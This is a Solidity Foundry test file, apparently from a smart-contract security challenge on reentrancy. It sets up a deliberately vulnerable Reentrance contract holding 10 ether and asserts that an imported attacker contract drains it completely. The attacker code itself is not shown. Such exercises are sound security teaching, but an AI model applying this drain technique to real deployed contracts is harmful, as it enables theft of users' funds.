// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/contracts/10_Re-entrancy.sol";
import {ReentranceAttacker} from "../src/attackers/10_Re-entrancyAttacker.sol";

contract ReentranceTest is Test {
    address private owner = makeAddr("owner");
    Reentrance private reentrance;
    ReentranceAttacker private reentranceAttacker;

    function setUp() public {
        vm.startPrank(owner);
        deal(owner, 10 ether);
        reentrance = new Reentrance();
        payable(address(reentrance)).call{value: 10 ether}("");
        vm.stopPrank();

        reentranceAttacker = new ReentranceAttacker(address(reentrance));
    }

    function test_ReentranceExploitVulnerability() public {
        address attacker = address(reentranceAttacker);

        vm.startPrank(attacker);
        deal(attacker, 1 ether);
        reentrance.donate{value: 1 ether}(attacker);
        reentrance.withdraw(1 ether);
        vm.stopPrank();

        assertEq(attacker.balance, 11 ether);
        assertEq(address(reentrance).balance, 0);
    }
}
